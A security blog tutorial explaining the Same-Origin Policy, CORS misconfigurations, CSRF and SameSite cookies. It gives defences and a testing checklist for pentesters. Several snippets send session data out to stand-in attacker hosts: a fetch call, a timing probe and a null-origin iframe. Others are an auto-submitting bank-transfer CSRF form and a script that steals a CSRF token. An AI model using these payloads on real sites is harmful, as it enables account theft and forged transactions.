---
title: "SOP, CORS, CSRF and SameSite"
date: 2026-05-09
draft: false
summary: "How SOP works, what CORS adds, what is CSRF, and how SameSite changes the picture."
---

Dear reader, these four concepts confused me for a long time. Every resource I read covered one piece in isolation, but never actually how everything interacts with each other. So after studying and experimenting, I came up with this post. I hope it helps.

## Same Origin Policy (SOP)

Same Origin Policy is the most important security mechanism in the modern web. It's what stops a malicious site you visit from silently reading data out of every other site you're logged into.

But what actually is an origin? An "origin" is the combination of three things: the scheme (https), the host (example.com), and the port (443). Two URLs are "same-origin" only if all three match exactly, so `https://example.com` and `http://example.com` are different origins, and so are `https://example.com` and `https://api.example.com`. SOP doesn't really stop cross-origin requests from being sent, but it stops the calling JavaScript from reading the actual response. A page on attacker.com can send requests to bank.com, but SOP makes sure the response never reaches the attacker's JavaScript. This prevents an attacker who hosts a malicious website from using their JavaScript to read and exfiltrate data from a victim's active session on another domain.

Please note that passive cross-origin resources were always allowed. SOP only kicks in when JavaScript tries to programmatically read a cross-origin response.

- **`<img>`**: load an image from any domain. You can display it, but JavaScript can't inspect the pixels.
- **`<script>`**: load and execute JavaScript from any domain. You can run it, but you can't read its source via `fetch`/`XHR`.
- **`<link>`**: load CSS from any domain. The styles apply, but JavaScript can't read the raw stylesheet contents cross-origin.

### Attacks SOP prevents
Let's say that you're logged into `bank.com`, and in another tab you visit `attacker.com`. Without SOP, the JavaScript on `attacker.com`, in your session's context, could just do this:

```javascript
// 'credentials: include' tells the browser to send cookies even cross-origin.
// Whether they actually get sent depends on the cookie's SameSite attribute (more on that later).
fetch('https://bank.com/api/account', { credentials: 'include' })
  .then(r => r.text())
  .then(data => {
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
  });
```

Your browser would happily attach your bank.com session cookies, the bank's API would return your account data, and the attacker's script would exfiltrate it to attacker-controlled infrastructure.

SOP shuts this down at the second step. The request still goes out with the cookies attached and the bank sends back the response. But when the attacker's JavaScript tries to read `r.text()`, the browser will block it.

The same protection extends to anything else that lives behind your session: webmail inboxes, internal dashboards, social DMs, CSRF tokens embedded in forms (we'll get to those in a bit) and everything that you have opened in your browser. If SOP didn't exist, every site you visit could silently scrape every other site you're logged into.

### What SOP does not do

It's worth being clear about what SOP doesn't protect against, because the line is subtle.

- **It doesn't prevent CSRF.** The request still goes out, the server still processes it. SOP only blocks the attacker from reading the *response*, not from triggering an action. So a malicious site can still make your browser send off a "transfer money" request, attach your cookies, and have the bank execute it. We'll cover this properly in the CSRF section.
- **It doesn't help against same-origin attacks like XSS.** Some developers think SOP prevents XSS. It doesn't. If attacker's JavaScript is running *on* `bank.com` (via a stored XSS, for example), it's already inside the origin and SOP has nothing to say about it.
- **It doesn't fully prevent side-channel leaks.** Even when SOP blocks reading a response, an attacker can sometimes infer things from timing, error states, or whether a resource loaded at all.

#### Side-channel: timing leaks

This particular technique comes from [Chen et al., USENIX Security 2018](https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-chen.pdf), and it's a great example of how SOP can be sidestepped without ever "reading" a response.
Even though SOP prevents the attacker from *reading* a cross-origin response, it usually doesn't prevent them from seeing *how long it took to arrive*. The attacker's JavaScript on `attacker.com` can use browser APIs to measure load times:

- **`performance.getEntriesByName()`**: provides high-resolution timestamps for every resource the browser loads.
- **Simple timers**: record `startTime = performance.now()`, trigger the request, then record `endTime` when `onload` or `onerror` fires.

Example:

```javascript
// 1. Start the timer
const start = performance.now();

// 2. Trigger a request to the target site (e.g., a private admin image)
const img = new Image();
img.src = "https://target-site.com/admin/dashboard_icon.png";

// 3. When the browser finishes (success or failure)
img.onload = img.onerror = function() {
    const duration = performance.now() - start;

    // 4. Send timing data back to the attacker's server
    fetch(`https://attacker-collector.com/log?time=${duration}`);
};
```

By comparing how long the request takes against a known baseline (anonymous request vs authenticated request), the attacker can determine the user's auth state. The exact direction of the timing skew depends on the endpoint, fast response from cache, slower response from a database hit, or vice versa from a 401 redirect, but the point is that the timing leaks information.

> **Modern hardening worth knowing about:** browsers also enforce **CORB** (Cross-Origin Read Blocking) and **CORP** (Cross-Origin-Resource-Policy) on top of SOP. CORB blocks cross-origin responses with sensitive content-types (HTML, JSON, XML) from being delivered to non-CORS-loaded contexts even when SOP would have allowed the load. CORP lets a server explicitly declare which origins are allowed to load its resources at all, including via passive `<img>` or `<script>` tags. If you're testing modern apps, look for the `Cross-Origin-Resource-Policy` response header.

---

That said, plenty of legitimate web applications actually need to read responses from a different origin. A frontend on `app.com` calling an API on `api.com`, for example. SOP would block that by default, which is why **Cross-Origin Resource Sharing (CORS)** was later introduced as a controlled way for servers to declare which origins are allowed to read their responses.

## CORS

**CORS is not a security mechanism.** It's the opposite of what most developers think it is. It's a permission system that relaxes the Same-Origin Policy. On every response, the server tells the browser 'I'm okay with these specific origins reading my responses,' and the browser enforces that policy.

Without CORS headers, SOP blocks the read by default, which is the secure state. CORS is used when you legitimately need cross-origin reads.

### How CORS is implemented and applied

As we mentioned earlier, a cross-origin request is actually sent, but the response cannot be read by the calling JavaScript. If a developer wants their API to be consumed by other domains, they have to explicitly tell the browser to allow it. This is done through a set of response headers that the server attaches to every response. The main ones are:

- **`Access-Control-Allow-Origin`**: the origin allowed to read the response. Example: `Access-Control-Allow-Origin: https://app.example.com`. Can also be `*` (wildcard, allow any origin).
- **`Access-Control-Allow-Credentials`**: whether the browser is allowed to include cookies and other credentials on the cross-origin request. If set to `true`, the `Allow-Origin` header cannot be `*`, it must be a specific origin.
- **`Access-Control-Allow-Methods`**: the HTTP methods that are allowed cross-origin. Example: `Access-Control-Allow-Methods: GET, POST, PUT, DELETE`.
- **`Access-Control-Allow-Headers`**: the request headers that are allowed cross-origin. Example: `Access-Control-Allow-Headers: Content-Type, Authorization`.
- **`Access-Control-Max-Age`**: how long (in seconds) the browser can cache the result of a preflight request, so it doesn't have to re-ask for permission every time. Example: `Access-Control-Max-Age: 86400` (24 hours). We'll cover preflights in a moment.

### Types of requests

Cross-origin requests come in two modes: **simple** and **non-simple**. The difference matters because it changes what the browser does *before* sending the request.

A request is **simple** when all three of these are true:

1. The method is `GET`, `HEAD`, or `POST`. Anything else (`PUT`, `DELETE`, `PATCH`) makes it non-simple.
2. The JavaScript hasn't added custom headers. Things like `Authorization`, `X-API-Key`, or any custom `X-*` header immediately make the request non-simple. Only a small whitelist (`Accept`, `Accept-Language`, `Content-Language`, `Content-Type`) can be set without triggering a preflight request.
3. If `Content-Type` is set, it has to be one of three values: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. Note: **`application/json` is not on this list**, which trips up developers constantly. Setting it makes the request non-simple.

If even one of these conditions fails, the request is non-simple.

#### What's the difference in practice?

- **Simple requests** are sent straight to the server. The browser does the CORS check *after* the response comes back, deciding whether to let the JavaScript read it. <u>The request itself always reaches the server and this behavior may lead to CSRF attacks.</u>
- **Non-simple requests** always trigger a **preflight**: the browser sends an `OPTIONS` request first, asking the server "are you okay with what I'm about to send?" Only if the server approves does the actual request go through. If not, the browser blocks it before the real request is ever sent, significantly reducing the likelihood of CSRF, since the attacker’s origin must first be explicitly approved.

### Walking through a request

Let's trace what actually happens on the wire for both kinds of cross-origin request.

#### Simple request

`https://app.example.com` calls a backend API on `https://api.example.com`:

```javascript
fetch('https://api.example.com/users/me', { credentials: 'include' })
```

1. **Browser adds the `Origin` header automatically** and the request goes out as:
```http
GET /users/me HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Cookie: session=abc123
```
2. **Server processes the request and responds.** The server has already done its job, the database query ran, the response is built, regardless of CORS:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json
    
{"id": 42, "email": "user@example.com"}
```
3. **The browser checks the response.** It compares the `Access-Control-Allow-Origin` value against the request's `Origin`. Match → JS gets the response. Mismatch → JS gets a CORS error in the console, but the request was already processed by the server.

That third step is where the whole CORS contract lives. The server-side work has already happened. CORS only decides whether the calling JavaScript gets to read the result.

#### Non-simple (preflighted) request

Same scenario, but now the frontend wants to send JSON with an `Authorization` header:

```javascript
fetch('https://api.example.com/users/me', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer eyJ...'
  },
  body: JSON.stringify({ email: 'new@example.com' })
})
```

This is non-simple (PUT method, JSON content-type, custom Authorization header), so the browser sends a preflight first:

1. **Browser sends a preflight `OPTIONS` request.** The actual `PUT` is held back:

```http
OPTIONS /users/me HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, content-type
```

Notice: the preflight typically carries no body and no business-logic side effects, the server's job here is just to answer the policy question.
2. **Server replies with what it allows.**
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT, POST, GET
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```
3. **Browser checks the preflight response.** Does the policy cover the `PUT` method, the `Authorization` and `Content-Type` headers, and the requesting origin? Yes → proceed. No → block the actual request entirely. The real `PUT` never gets sent.
4. **If approved, the browser sends the real request.** Same flow as a simple request from here: server processes, responds with `Allow-Origin`, browser does the final check.

The key difference: **for a preflighted request, a misconfigured server-side CORS check that blocks the preflight means the real request never even reaches the application logic.** That's why non-simple requests are much harder to use for CSRF, the attacker would need the preflight to pass, which requires the server to actively allow their origin.

### Common CORS misconfigurations

The CORS spec is more expressive than it looks, but the policy itself isn't. There's no native way to say "trust any subdomain of `example.com`" or "trust this list of three origins." Developers end up writing their own origin-validation logic, and this is where many vulnerabilities exist.

The taxonomy below follows the categorization from [Chen et al., USENIX Security 2018](https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-chen.pdf), which I think is still the cleanest breakdown of CORS bugs in the wild. From a pentester's perspective, these are the patterns I look for first on my engagements.

#### The wildcard + credentials trap

Browsers explicitly **forbid** the combination of `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. If a server sends both, the browser treats the response as a CORS failure and the calling JavaScript gets nothing. The reasoning is straightforward: a wildcard means "any origin can read this," and combining that with cookies would mean any site on the internet could read authenticated responses for any logged-in user.

> **Side note on `credentials: 'include'`:** It only controls browser-managed credentials (cookies, HTTP auth, TLS client certs). It does NOT affect the `Authorization: Bearer <token>` header, which is manually set by your JavaScript and sent regardless. However, adding an `Authorization` header makes the request non-simple, triggering a preflight, and that preflight needs to approve the header via `Access-Control-Allow-Headers`.

This rule is where a lot of the real-world CORS pain comes from. A developer wants their frontend to call their API with cookies, sets `Allow-Origin: *` because it's the easiest config, hits the wildcard-with-credentials block, and goes looking for a workaround. The right workaround is an allowlist (parse the incoming `Origin`, compare it to a list of known-good origins, set the header to that exact value). The wrong workaround, which is what most devs reach for, is to just reflect whatever `Origin` the request sent. That's where the next bug class comes from.

In summary: the wildcard exists for *unauthenticated* public APIs. The moment cookies, `Authorization` headers, or any kind of session need to flow, you need an explicit list of trusted origins.

#### Reflecting the Origin header

The laziest CORS implementation goes something like:

```python
# pseudo-code
response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

This is simple and it "works", but it's equivalent to trusting *every* origin on the internet. Any attacker site can hit the API and get a tailored `Access-Control-Allow-Origin` echoed right back, which means their JavaScript reads the response. Combined with `Allow-Credentials: true`, the attacker reads authenticated responses.

If you see the response's `Allow-Origin` always exactly matching whatever you send in `Origin`, that's reflection.

#### Validation mistakes

When developers do try to validate the `Origin` header, the implementation tends to fall into one of four traps.

**Prefix matching.** The check confirms the trusted domain appears at the start of the origin, but doesn't check what comes after. The developer wants to trust `example.com`, but the check matches `example.com.attacker.com` too. The attacker just creates that subdomain on a domain they already control and gets in.

**Suffix matching (the "endswith" bug).** The dev wants to allow any subdomain of `example.com`, so they write `origin.endsWith("example.com")`, forgetting the leading dot. Now `attackerexample.com` (which the attacker can register) also passes, because the literal string match doesn't care about the boundary.

**Unescaped dots in regex.** The check uses regex, intending `example\.com`, but writes `example.com` instead. The dot is now a wildcard, so `exampleXcom` matches. Attacker registers a domain that fits the relaxed pattern.

**Substring matching.** The check looks for the trusted domain as a substring anywhere in the origin. Trusting `washingtonpost.com` substring-matches in any origin that contains the string. So `washingtonpost.com.attacker.com` and `attackerwashingtonpost.com` both pass. The attacker registers either of those and gets in.

All four are the same class of bug: **partial string matching where full-origin equality was intended.** The fix is always the same too, parse the `Origin` value into its scheme/host/port components and compare against an <u>explicit</u> allowlist.

#### Trusting the null origin

Some servers configure `Access-Control-Allow-Origin: null` because they want to support local file pages, hybrid mobile apps, or sandboxed contexts that don't have a "real" origin. When paired with `Access-Control-Allow-Credentials: true`, this becomes a serious problem.

The catch is that an attacker can produce a `null` origin from any website using a <u>sandboxed iframe</u>:

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://api.example.com/users/me', { credentials: 'include' })
      .then(r => r.text())
      .then(data => {
        // attacker reads authenticated response here
        fetch('https://attacker.com/log?d=' + encodeURIComponent(data));
      });
  </script>
"></iframe>
```

Because the iframe is sandboxed, the JavaScript inside it sends `Origin: null` on every request. A server that trusts `null` will hand back the response with credentials attached, and the attacker reads it.

If you ever see `Access-Control-Allow-Origin: null` in a response, especially with `Allow-Credentials: true`, that's a valid finding.

#### Cache poisoning via missing `Vary: Origin`

When the server dynamically generates `Allow-Origin` and forgets `Vary: Origin`, an HTTP cache or CDN sitting in front of the server may serve a response cached for one origin to a request from a different origin. In the simplest case, this just breaks legitimate users (cached `Allow-Origin: https://app.example.com` served to a request from a different valid origin → CORS check fails for them). In worse cases, it stacks with other caching misconfigurations to enable cross-origin data exfil.
The fix is one line, send `Vary: Origin` on every CORS-aware response.

### CORS does not protect your server

Worth saying explicitly because devs get this wrong all the time: **CORS does not block requests from reaching your server.** Your endpoints are exposed regardless of CORS configurations. CORS is only there to control whether a *browser* lets the calling JavaScript read the response.

In summary:

- <u>A malicious site can still trigger any cross-origin request to your API.</u> The request hits your server, your code runs, the database is queried, side effects happen.
- Server-side authorization, CSRF tokens, rate limiting, and authentication still need to do their jobs.

If CORS is misconfigured to allow credentialed requests from attacker-controlled origins, an attacker may be able to read authenticated responses, extract CSRF tokens, and bypass CSRF protections entirely.

This is why CSRF still exists despite SOP and CORS being everywhere. CORS only restricts reads and it doesn't restrict the request from being sent. The server doesn't know or care about the browser's CORS check and by the time the request hits the application code, the damage (or the logging, or the rate-limit hit, or the database write) is already done.
Which is exactly the bug class we're covering next.

## CSRF

CSRF stands for **Cross-Site Request Forgery**. It tricks a victim's browser into performing an action they didn't intend to take, using the context of their existing authenticated session. While SOP and CORS protect the *confidentiality* of data (preventing the attacker from reading the response), CSRF attacks the *integrity* of the session (forcing the browser to send a state-changing request).

Examples of what an attacker can achieve:

- Executing unauthorized bank transfers.
- Changing account passwords or email addresses.
- Deleting or exfiltrating personal content.

### How CSRF works

The attack works because browsers automatically attach cookies to requests directed at the target site, regardless of who triggered the request. If you are logged into `bank.com` and visit `attacker.com`, the attacker's site can trigger a POST request to `https://bank.com/transfer`. Your browser, seeing the destination is `bank.com`, attaches your session cookies, and the bank treats the request as legitimate.

#### CSRF in 2026

Quick reality check: most modern browsers default cookies to `SameSite=Lax` when the developer doesn't specify a value. Chrome made this the default in 2020, and Firefox and Edge followed. This single change killed a huge chunk of classic drive-by CSRF on its own. If a session cookie is set without an explicit `SameSite` value, the browser silently treats it as `Lax`, and the cross-site form-POST attack just stops working.

So you may ask, why do CSRF attacks still exist?

- Plenty of apps explicitly set `SameSite=None` for legitimate reasons (third-party widgets, OAuth flows, embedded iframes, federated logins).
- Subdomain XSS or takeover bypasses `SameSite` entirely, since subdomains are considered same-site.
- Apps that accept `GET` for state-changing actions are bypassed by `Lax` trivially, because top-level GET navigations still send `Lax` cookies.(still surprisingly common)
- Chrome's 'Lax-Allowing-Unsafe' 2-minute window: when a cookie is set without an explicit `SameSite` value (so the browser silently defaults it to Lax), it temporarily behaves like None for top-level POST requests for 120 seconds. Cookies set with explicit `SameSite=Lax` don't get this exemption.
- Apps with broken or missing CSRF tokens *and* `SameSite=None` are still very much exploitable.

CSRF didn't die. It got narrower. The bugs that remain are usually stacked with another misconfiguration: a credentialed CORS reflection, a subdomain XSS, a careless `SameSite=None`, or a state-changing GET endpoint.

### The classic CSRF PoC

The textbook CSRF payload is an auto-submitting HTML form hosted on the attacker's site. The victim, while logged into `bank.com` in another tab, visits `attacker.com/free-iphone.html`:

```html
<!-- Hosted on https://attacker.com/free-iphone.html -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="attacker_account">
      <input type="hidden" name="amount" value="10000">
    </form>
  </body>
</html>
```

The page silently submits the form. The browser:

1. Sees the form's action points to `bank.com`.
2. Attaches any cookies for `bank.com` that the `SameSite` policy allows (the critical step).
3. Sends the POST with the victim's credentials.
4. The bank's server receives a valid, authenticated request and processes the transfer.

The attacker never reads the response. They don't need to. The action has been performed.

Note that this is a simple request in CORS terms: HTML form POSTs default to `application/x-www-form-urlencoded`, which is on the simple-request whitelist, no custom headers and that's why no preflight is triggered. The browser just fires the request straight through. Attackers will try to stick to simple requests for exactly this reason. Switching to JSON or adding an `Authorization` header would force a preflight, which the attacker doesn't control and usually can't pass.

### The three steps of a CSRF attack

For a CSRF attack to succeed, three things must happen:

1. The attacker causes the victim's browser to send a request to the target site.
2. The browser includes the victim's session cookie with that request.
3. The server accepts the request as legitimate and performs the action.

The most important step is the second one. If the browser does not send the session cookie, the target site sees the request as unauthenticated and rejects it.

> **No session cookie → no authenticated session → no CSRF.**

This is exactly what the `SameSite` cookie attribute controls. We'll cover that in the next major section.

### CSRF mitigations

The standard defenses against CSRF:

- **CSRF tokens.** Cryptographically random values tied to the user's session and required on every state-changing request.
- **Avoid `GET` for state-changing actions.** GET requests are sent on top-level navigations even with `SameSite=Lax`.
- **Verify the `Origin` or `Referer` header** on state-changing requests. Easy to deploy and effective.
- **`SameSite` cookies.** The browser-level mitigation we'll cover next.

CSRF tokens work by requiring each state-changing request to include a secret value tied to the user's session. Although an attacker can cause the victim's browser to send authenticated requests, they cannot normally read pages from the target site (thanks to SOP) and therefore cannot obtain the correct token.

#### A modern defense worth knowing: `Sec-Fetch-Site`

Modern browsers automatically send a `Sec-Fetch-Site` header on every request, with values like `same-origin`, `same-site`, `cross-site`, or `none`. The browser sets it and the page can't forge it.

For state-changing endpoints, rejecting any request where `Sec-Fetch-Site` is `cross-site` is a strong, low-effort CSRF defense that doesn't depend on cookies or tokens at all. Most modern frameworks ignore this header entirely, which is a missed opportunity.

### Bypassing CSRF tokens

Simple bypasses occur when:

- **The CSRF token is not tied to a user session.** An attacker can grab a valid token from their own session and replay it cross-origin. The backend accepts it because the token validates in isolation.
- **Tokens are predictable.** If the token is a hash of the username, a timestamp, or anything guessable, you might be able to forge or brute-force it.
- **Tokens are validated only when present.** Some servers skip validation entirely if the token field is missing from the request. Try omitting it.

#### Exfiltrating CSRF tokens via misconfigs

Under normal conditions, SOP prevents an attacker from reading pages on the target site, which means they cannot retrieve CSRF tokens embedded in HTML forms.

However, if the application suffers from:

- A credentialed CORS misconfiguration (one of the misconfigs from the previous section).
- A same-origin XSS vulnerability (stored or reflected).
- Another mechanism that allows cross-origin response reads.

Then the attacker can fetch a page containing the CSRF token, parse the response, and extract the token programmatically.

The following payload assumes a credentialed CORS misconfiguration is already in place (otherwise the cross-origin read in step 1 fails). The attacker first fetches the form page, parses out the token, and then submits a forged request:

```javascript
// Step 1: fetch the page containing the CSRF token (only works if CORS is misconfigured)
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bank.com/personal_info.php', false);
xhr.withCredentials = true;
xhr.send();

var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);
```

Then the attacker submits the cross-origin request with the extracted token:

```javascript
// Step 2: submit the malicious request, now with a valid token
var request = new XMLHttpRequest();
var params = `name=myuser&csrf_token=${csrftoken}`;
request.open('POST', 'https://bank.com/my_profile.php', false);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.withCredentials = true;
request.send(params);
```

Even with a CSRF token in place, the attacker retrieved it and sent a valid (but malicious) request that the server accepts. The CSRF token alone isn't enough. Its security depends on the attacker not being able to read the page that contains it, which is SOP's job, and CORS not being misconfigured to undo SOP for attacker origins.

---

## SameSite Cookies

`SameSite` is a cookie attribute that controls whether cookies are attached to cross-site requests. It's the modern primary defense against CSRF, and it operates entirely in the browser.

Whenever the browser is about to send a request, it asks:

1. Is this request same-site or cross-site?
2. What's the cookie's SameSite value?
3. Does the request context qualify (top-level navigation, safe method, background request)?
4. Based on those answers, do I attach the cookie or not?

This decision happens entirely in the browser before the request is sent. If the cookie is not attached, the server receives an unauthenticated request and CSRF fails automatically.

### The three SameSite values

- **`SameSite=Strict`**
  - Cookies are sent only for same-site requests.
  - Any cross-site request, including ordinary link clicks, omits the cookie.
  - Provides the strongest built-in CSRF protection.

- **`SameSite=Lax`** *(the modern default)*
  - Cookies are sent for same-site requests.
  - Cookies are also sent for top-level cross-site navigations using safe methods such as `GET`.
  - Cookies are not sent with background requests such as `fetch()`, `XMLHttpRequest`, `<img>`, or `<iframe>`.

- **`SameSite=None; Secure`**
  - Cookies are sent in both same-site and cross-site requests.
  - Requires the `Secure` attribute and HTTPS.
  - Necessary for third-party integrations, but provides no CSRF protection by itself and has to be always paired with CSRF tokens.

### What "site" actually means

Unlike SOP, which compares scheme + host + port, `SameSite` works at the **site** level: scheme + registrable domain (also known as **eTLD+1**). This means `app.example.com` and `api.example.com` are different *origins* but belong to the same *site*.

Crucially, the port and subdomain are not part of the site. Multiple origins can be treated as the same site even if their ports or subdomains differ:

| Request From          | Request To                        | Classification                  |
|-----------------------|-----------------------------------|---------------------------------|
| https://example.com   | https://sub.example.com           | Same-Site                       |
| https://example.com   | https://example.com:3000          | Same-Site                       |
| https://example.com   | https://api.sub.example.com:8080  | Same-Site                       |
| http://example.com    | https://example.com               | Cross-Site (scheme mismatch)    |
| https://example.com   | https://external-api.net          | Cross-Site                      |

This subtle origin-vs-site distinction is where bugs live, hold onto it for the bypass section below.

### SameSite and CSRF risk at a glance

| Cookie Setting | Cross-Site `fetch()` | Cross-Site Form POST | Top-Level GET Navigation | CSRF Risk |
|----------------|---------------------|----------------------|--------------------------|-----------|
| `Strict`       | No cookie           | No cookie            | No cookie                | Extremely low |
| `Lax`          | No cookie           | No cookie            | Cookie sent              | Low (only if GET changes state) |
| `None; Secure` | Cookie sent         | Cookie sent          | Cookie sent              | High unless protected by CSRF tokens |

### Bypassing SameSite

Attackers can leverage specific behaviors to bypass `SameSite` protections:

- **GET-based bypasses (Lax).** By default, `SameSite=Lax` allows cookies to be sent with "safe" top-level navigations, such as clicking a link that triggers a GET request. If a web application uses GET requests for state-changing operations, or is misconfigured to accept GET in place of POST (HTTP verb tampering), `SameSite` protection becomes ineffective.

- **Client-side redirects (Strict).** To bypass `SameSite=Strict`, an attacker can exploit a client-side redirect on the target site. When a victim is sent to a redirection endpoint on the target site, the final request is initiated by that site itself. Because this is considered same-site navigation, the browser attaches the cookies even if they are marked `Strict`.

- **Subdomain exploitation (XSS or takeover).** Since subdomains are considered the same site, an XSS vulnerability on a subdomain (`subdomain.example.com`) can be used to launch a CSRF attack against the main application. The browser treats the request as same-site, including the victim's session cookies and successfully executing the forgery. The same applies to subdomain takeovers.

### Hardening with cookie prefixes: `__Host-` and `__Secure-`

A small but valuable hardening worth knowing about. The browser enforces extra rules on cookies whose names start with these prefixes:

- **`__Secure-`**: the cookie must have the `Secure` flag and be set over HTTPS. The browser rejects it otherwise.
- **`__Host-`**: same as `__Secure-`, plus the cookie must have `Path=/`, must NOT have a `Domain` attribute, and must be set over HTTPS.

The interesting one for CSRF and SameSite is `__Host-`. The "no `Domain` attribute" rule means the cookie is bound to the *exact* host that set it. A subdomain can't set a cookie that the parent domain reads, and vice versa. This blocks a class of attack where an attacker who controls or compromises a subdomain (`evil-takeover.example.com`) tries to plant a session cookie that the main app (`example.com`) will pick up.

Combined with `SameSite=Strict`, a session cookie like:

```
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Strict
```

is about as locked down as you can get with browser-native controls. Worth pushing for in any new app, and worth checking for in any pentest report's "hardening recommendations" section.

---

## Wrapping up

The four mechanisms covered here all live at different layers of the stack, and confusing them is what leads to the misconfigurations we keep finding on engagements:

- **SOP** is the browser's default deny. It blocks JavaScript from reading cross-origin responses.
- **CORS** is the server-side mechanism that selectively relaxes SOP for chosen origins. <u>It does not protect the server</u>, only restricts what the browser lets JavaScript read.
- **CSRF** is the attack class that exploits the fact that *neither* SOP nor CORS blocks the request itself, only the read.
- **SameSite** is the modern cookie-level mitigation that prevents the attacker's request from carrying the victim's session in the first place. It's the reason most drive-by CSRF stopped working in 2020.

A clean mental model for testing:

- If the target uses cookies for auth, check `SameSite`. If it's `None`, look for missing CSRF tokens.
- If `SameSite=Lax`, look for state-changing GET endpoints or HTTP verb tampering.
- If `SameSite=Strict`, look for client-side redirects, subdomain XSS, or subdomain takeovers.
- If the target uses CORS with `Allow-Credentials: true`, run the misconfiguration checklist (reflection, null origin, prefix/suffix matching, missing `Vary`).
- If the target uses bearer tokens in `Authorization` headers, the attack surface shifts: CSRF is largely off the table (no auto-attached credentials), but token leakage via XSS, weak storage, or CORS misconfigurations becomes the main concern.

Browser security is layered on purpose and each layer assumes the others might fail.

---

## References & further reading

**Specs and RFCs:**

- [RFC 6454 — The Web Origin Concept](https://datatracker.ietf.org/doc/html/rfc6454).
- [RFC 6265bis (draft) — Cookies: SameSite and security](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7). 
- [Fetch Standard](https://fetch.spec.whatwg.org/).

**Research papers:**

- [Chen et al., *We Still Don't Have Secure Cross-Domain Requests: an Empirical Study of CORS*, USENIX Security 2018](https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-chen.pdf). Worth reading in full.
- [Schwenk et al., *The Same-Origin Policy: Evaluation in Modern Browsers*, USENIX Security 2017](https://nds.rub.de/media/nds/veroeffentlichungen/2017/07/13/Same-Origin-Policy_Security-Evaluation.pdf).

**Practical guides:**

- [OWASP — Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html). OWASP's defender-side reference for CSRF mitigations. Read this if you're writing CSRF recommendations into pentest reports.
- [HackTheBox Academy](https://academy.hackthebox.com/). The web-attacks and web-requests modules cover SOP, CORS, CSRF, and SameSite hands-on, with labs for each. Helped me the most.
- [PortSwigger Web Security Academy — CORS](https://portswigger.net/web-security/cors) and [CSRF](https://portswigger.net/web-security/csrf).